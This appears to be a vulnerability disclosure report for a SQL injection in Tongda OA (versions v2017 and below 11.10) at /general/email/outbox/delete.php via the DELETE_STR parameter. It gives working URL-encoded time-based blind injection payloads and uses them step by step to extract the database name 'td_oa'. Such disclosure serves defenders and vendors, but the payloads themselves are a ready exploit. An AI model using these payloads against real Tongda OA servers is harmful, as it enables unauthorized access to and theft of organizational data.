SQL injection vulnerability exists in Tongda OA v2017 and versions below 11.10

official website:https://www.tongda2000.com/

version:Less than v11.10, v2017

route：/general/email/outbox/delete.php

injection parameter:$DELETE_STR



#### 	1.Vulnerability analysis

The parameter $DELETE_STR here is directly spliced into the sql statement after removing the null value. There is a sql injection point.

![](https://github.com/rockersiyuan/CVE/blob/main/TongDa%20Sql%20inject.assets/t1.png)

At the same time, global parameter filtering is shown in the figure below, and only conventional injection filtering detection is performed.

![image](https://github.com/rockersiyuan/CVE/blob/main/TongDa%20Sql%20inject.assets/image-20240126094241423.png)

#### 	2.Vulnerability verification

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/rockersiyuan/CVE/blob/main/TongDa%20Sql%20inject.assets/image-20240126094806730.png)

If we replace 116 with another value such as 115, then there will be no time delay, thus proving that our injection is successful. There is a sql injection vulnerability here.

```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/rockersiyuan/CVE/blob/main/TongDa%20Sql%20inject.assets/image-20240126095114500.png)

#### 	3.Exploit

Based on the above verification analysis, the SQL injection vulnerability exists. We can continue to obtain the complete name of the entire database through blind injection.

The second digit of the database is intercepted through blind injection, and the second digit is judged to be the letter d through the delay time, and the ASCII code is 100.

```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/rockersiyuan/CVE/blob/main/TongDa%20Sql%20inject.assets/image-20240126095822818.png)

The third digit of the database is intercepted through blind injection, and the second digit is judged to be '_' through the delay time, and the ASCII code is 95.

```
1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/rockersiyuan/CVE/blob/main/TongDa%20Sql%20inject.assets/image-20240126095911470.png)

The fourth digit of the database is intercepted through blind injection, and the second digit is judged to be the letter o through the delay time, and the ASCII code is 111.

```
1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/rockersiyuan/CVE/blob/main/TongDa%20Sql%20inject.assets/image-20240126100122531.png)

The fifth digit of the database is intercepted through blind injection, and the second digit is judged to be the letter a through the delay time, and the ASCII code is 97.

```
1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/rockersiyuan/CVE/blob/main/TongDa%20Sql%20inject.assets/image-20240126100029696.png)

In summary, the complete database name can be obtained based on this sql injection vulnerability: td_oa
